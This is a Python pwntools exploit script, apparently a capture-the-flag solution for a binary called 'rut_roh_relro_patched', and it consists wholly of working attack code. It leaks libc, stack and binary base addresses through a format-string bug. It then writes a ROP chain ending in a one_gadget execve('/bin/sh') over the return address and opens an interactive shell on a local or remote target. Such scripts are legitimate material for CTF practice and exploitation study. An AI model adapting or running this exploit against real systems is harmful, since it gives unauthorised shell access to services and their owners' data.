#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('rut_roh_relro_patched')
libc = exe.libc

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *main+178
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# 0xc961a execve("/bin/sh", r12, r13)
# constraints:
#   [r12] == NULL || r12 == NULL
#   [r13] == NULL || r13 == NULL

# 0xc961d execve("/bin/sh", r12, rdx)
# constraints:
#   [r12] == NULL || r12 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xc9620 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL


def init():
    global io

    io = start()

def solve():
    lk = "%1$p.%62$p.%74$p"
    io.sendlineafter('?', lk)
    io.recvuntil('post:')
    io.recvline()
    leak = io.recvline().split(b'.')
    print(leak)

    libc.address = int(leak[0], 16) - (0x7f85d12d9723-0x00007f85d1109000)
    stack = int(leak[1], 16)
    ret = stack + 0x21
    exe.address = int(leak[2], 16) - (0x55d25db40165-0x000055d25db3f000)

    info("libc base: %#x", libc.address)
    info('elf base: %#x', exe.address)
    info("stack leak: %#x", stack)
    info("stack ret address: %#x", ret)

    offset = 6
    pop_rdi = exe.address + 0x000000000000127b # pop rdi; ret; 
    bin_ret = exe.address + 0x0000000000001016 # ret; 

    pop = exe.address + 0x0000000000001274 # pop r12; pop r13; pop r14; pop r15; ret; 

    one_gadget = libc.address + 0xc961a

    write = {
        ret: pop,
        ret+8: 0x0,
        ret+16: 0x0,
        ret+24: 0x0,
        ret+32: 0x0,
        ret+40: one_gadget
    }
    payload = fmtstr_payload(offset, write)

    io.sendlineafter('?', payload)

def main():
    
    init()
    solve()
    
    io.interactive()

if __name__ == '__main__':
    main()

